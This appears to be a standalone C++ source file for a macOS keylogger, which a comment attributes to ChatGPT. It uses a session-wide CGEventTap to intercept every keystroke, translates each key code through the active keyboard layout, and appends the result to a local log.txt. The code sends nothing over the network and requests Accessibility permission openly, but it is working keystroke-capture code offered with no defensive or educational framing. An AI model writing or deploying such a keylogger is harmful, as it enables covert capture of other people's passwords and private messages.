#include <iostream>
#include <fstream>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h> // For UCKeyTranslate

//
// THis code is written by chatGPT
//

using namespace std;

// Callback function to handle keyboard events
CGEventRef keyCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
{
    if (type == kCGEventKeyDown)
    {
        // Get the key code
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

        // Get the keyboard layout
        TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardLayoutInputSource();
        CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
        const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

        // Translate key code to Unicode character
        UInt32 deadKeyState = 0;
        UniCharCount maxStringLength = 4;
        UniCharCount actualStringLength = 0;
        UniChar unicodeString[4];

        UCKeyTranslate(keyboardLayout,
                       keycode,
                       kUCKeyActionDisplay,
                       (CGEventGetFlags(event) >> 16) & 0xFF,
                       LMGetKbdType(),
                       kUCKeyTranslateNoDeadKeysBit,
                       &deadKeyState,
                       maxStringLength,
                       &actualStringLength,
                       unicodeString);

        ofstream logfile;
        logfile.open("log.txt", ios::app);
        for (int i = 0; i < actualStringLength; ++i)
        {
            logfile << unicodeString[i];
        }
        logfile.close();
    }
    return event;
}

int main()
{
    // Request Accessibility Permissions if not already granted
    const void *keys[] = {kAXTrustedCheckOptionPrompt};
    const void *values[] = {kCFBooleanTrue};
    CFDictionaryRef options = CFDictionaryCreate(kCFAllocatorDefault, keys, values, 1, &kCFCopyStringDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    bool accessibilityEnabled = AXIsProcessTrustedWithOptions(options);
    CFRelease(options);

    if (!accessibilityEnabled)
    {
        cerr << "Accessibility permissions are not granted. Please enable them in System Preferences." << endl;
        exit(1);
    }

    // Create an event tap
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault,
                                              CGEventMaskBit(kCGEventKeyDown), keyCallback, NULL);
    if (!eventTap)
    {
        cerr << "Failed to create event tap." << endl;
        exit(1);
    }

    // Create a run loop source
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);

    // Add the event tap to the current run loop
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);

    // Enable the event tap
    CGEventTapEnable(eventTap, true);

    // Run the loop
    CFRunLoopRun();

    return 0;
}
